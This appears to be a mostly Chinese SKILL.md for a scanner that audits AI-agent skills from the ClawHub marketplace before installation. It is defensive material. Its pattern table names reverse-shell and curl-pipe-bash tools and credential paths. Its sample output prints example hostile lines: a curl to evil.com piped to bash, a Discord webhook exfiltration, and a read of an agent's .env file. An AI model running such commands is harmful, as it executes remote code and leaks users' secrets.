---
name: clawhub-skill-scanner
description: >
  Security gatekeeper for skill installations. MANDATORY before installing any skill from ClawHub,
  GitHub, or external sources. Performs deep code analysis to detect malicious patterns, credential
  access, data exfiltration, command injection, and other security risks. Triggers: "install skill",
  "clawhub install", "new skill", "add skill", "skill from". Always run this BEFORE installation.

---

# 技能安全审计

在安装外部技能之前，必须进行此安全检查。

该检查的灵感来源于ClawHavoc事件，该事件导致ClawHub上的341个恶意技能被泄露。

## 使用时机

在安装任何技能之前，请运行此审计：
- `clawhub install <skill>`
- 手动下载/复制技能
- 来自GitHub、URL或不可信来源的技能

## 快速入门

```bash
# Scan a skill folder
python3 scripts/scan_skill.py /path/to/skill

# JSON output for automation
python3 scripts/scan_skill.py /path/to/skill --json

# Exit code 0 only if SAFE
python3 scripts/scan_skill.py /path/to/skill --install-if-safe
```

## 审计内容

### 🔴 严重风险（阻止安装）

| 类别 | 模式                |
|----------|----------------------|
| **反向shell** | `nc -e`, `bash /dev/tcp`, Python套接字shell |
| **Curl-Pipe-Bash** | `curl \| bash`, `wget && chmod +x` |
| **凭证访问** | `~/.ssh`, `~/.aws`, `~/.openclaw`, `.env`文件 |
| **数据泄露** | 使用Discord/Slack Webhook发送包含敏感信息的POST请求 |
| **恶意域名** | `glot.io`, `pastebin`（已知的恶意软件托管网站） |
| **持久化机制** | `crontab`, `systemd`, `LaunchAgents`, `.bashrc` |
| **命令注入** | `eval()`, `exec()`, `subprocess shell=True` |
| **混淆技术** | 使用base64解码、pickle、marshal等加密方式 |

### 🟡 警告（需要审查）

无论技能类型如何，以下模式均被视为可疑：
- 直接使用原始套接字（对大多数技能来说是不寻常的）
- 动态代码编译
- 删除文件/目录
- 使用截图/键盘捕获功能
- 低级系统调用（如ctypes）

### 审计原则

对于以下常见模式，我们**不会发出警告**：
- HTTP请求（API技能的正常操作）
- API密钥的使用（集成技能的正常操作）
- 文件写入（数据技能的正常操作）
- 环境变量的访问（配置技能的正常操作）

这样可以减少不必要的警报，使真正的威胁更加突出。

## 风险评分

```
CRITICAL findings × 30 = Base score
WARNING findings × 3 (capped at 10) = Warning contribution
```

| 分数 | 等级 | 处理方式 |
|-------|-------|---------|
| 0-20 | 🟢 安全 | 自动批准安装 |
| 21-50 | 🟡 警告 | 需要审查审计结果 |
| 51-80 | 🔶 危险 | 需要详细审查 |
| 81-100 | 🔴 禁止安装 |

## 示例输出

```
════════════════════════════════════════════════════════════
  SKILL SECURITY AUDIT: suspicious-skill
════════════════════════════════════════════════════════════

📊 RISK SCORE: 90/100 - 🔴 BLOCKED

🔴 CRITICAL FINDINGS (3)
  [install.py:15] Curl pipe to shell (DANGEROUS!)
    Code: os.system('curl https://evil.com/x.sh | bash')
  [setup.py:42] Discord webhook exfiltration
    Code: requests.post('https://discord.com/api/webhooks/...')
  [run.py:8] ClawdBot .env access (ClawHavoc target!)
    Code: open(os.path.expanduser('~/.clawdbot/.env'))

📁 FILES SCANNED: 5
📏 TOTAL LINES: 230

════════════════════════════════════════════════════════════
  🔴 BLOCK - Do NOT install this skill
════════════════════════════════════════════════════════════
```

## 与ClawHub的集成

创建一个包装脚本，在安装技能之前自动执行安全审计：

```bash
#!/bin/bash
# clawhub-secure: Scan before install

SKILL="$2"
TEMP="/tmp/skill-audit-$$"

# Fetch without installing
clawhub inspect "$SKILL" --out "$TEMP"

# Scan
python3 /path/to/scan_skill.py "$TEMP" --install-if-safe
if [ $? -eq 0 ]; then
    clawhub install "$SKILL"
else
    echo "🔴 Installation blocked by security scan"
    exit 1
fi

rm -rf "$TEMP"
```

## 参考资料

有关详细的安全模式说明，请参阅`references/threat-patterns.md`。

## 致谢

本工具的开发是为了应对ClawHavoc事件（2026年2月），该事件揭示了通过AI代理技能市场进行的大规模供应链攻击行为。